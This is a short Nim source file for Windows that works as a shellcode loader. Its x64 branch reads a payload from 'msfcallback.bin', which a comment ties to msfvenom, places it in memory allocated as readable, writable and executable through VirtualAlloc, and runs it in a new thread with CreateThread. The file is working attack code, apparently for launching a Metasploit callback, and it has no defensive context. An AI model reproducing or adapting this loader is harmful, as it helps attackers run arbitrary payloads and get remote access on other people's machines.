#import osproc
#import std/rdstdin
import winim

when defined(windows):

    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    when defined(i386):
        # ./msfvenom -p windows/messagebox -f csharp, then modified for Nim arrays
        echo "[*] Running in x86 process"

    elif defined(amd64):
        func toByteSeq*(str: string): seq[byte] {.inline.} =
            ## Converts a string to the corresponding byte sequence.
            @(str.toOpenArrayByte(0, str.high))
        
        echo "[*] Running in x64 process"
        let scFile = readFile("msfcallback.bin")
        let shellcode = scFile.toByteSeq

        let scLen = cast[SIZE_T](shellcode.len)
        let buffer = VirtualAlloc(cast[LPVOID](0), scLen, cast[DWORD](0x00001000), cast[DWORD](0x40))
        try:
            copyMem(buffer, unsafeAddr shellcode[0], scLen)
        except:
            echo "[*] CopyMem failed!"
        try:
            let tHandle = CreateThread(cast[LPSECURITY_ATTRIBUTES](NULL), cast[SIZE_T](0), cast[LPTHREAD_START_ROUTINE](buffer), cast[LPVOID](NULL), cast[DWORD](0), cast[LPDWORD](NULL))
            WaitForSingleObject(tHandle, cast[DWORD](0xFFFFFFFF))
        except:
            echo "[*] CreateThread failed!"
